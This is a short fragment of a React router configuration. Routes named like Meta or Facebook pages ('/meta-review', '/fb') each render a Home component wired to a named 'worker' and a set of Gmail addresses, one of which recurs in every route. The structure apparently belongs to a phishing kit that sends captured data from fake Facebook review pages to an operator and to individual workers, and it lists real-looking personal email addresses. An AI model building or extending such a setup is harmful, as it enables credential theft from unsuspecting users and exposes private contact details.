  ...
  return (
    <div>
        <Routes>
           ...
           <Route path='/sfhgfsgf' element={<Home name="Saif Rehman" emails={["unaisnizamani598@gmail.com","sophiasloanadvertising@gmail.com"]} workerEmail="sophiasloanadvertising@gmail.com" />} />
...
<Route path='/meta-review' element={<Home name="Usman" emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail="meytal.cohen.official.ads@gmail.com" />} />
...
<Route path='/get' element={<Home name="Rouf" emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail="ajcyksgvvis123@gmail.com" />} />
            ...
            <Route path='/fb' element={<Home name="Azizullah" emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail="hibu.official.ads.5@gmail.com" />} /> 
